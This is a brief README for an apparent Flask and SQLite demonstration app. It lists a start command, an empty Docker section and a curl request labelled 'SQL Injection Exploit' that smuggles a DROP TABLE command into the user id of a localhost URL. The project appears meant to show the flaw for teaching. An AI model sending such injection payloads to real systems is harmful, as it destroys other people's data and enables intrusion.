# flask_demo
Flask w\ SQL Light Demonstration

To start website:
```sh
python3 start.py
```

## Demo points
Docker run command
```sh
```

SQL Injection Exploit
```sh
curl -X PUT "http://localhost:5050/users/6;DROP%20TABLE%20USERS;--?firstName=test"
```
More info about exploit can be found <https://www.pythonforengineers.com/xkcd-style-sql-injection-hack-in-python/>
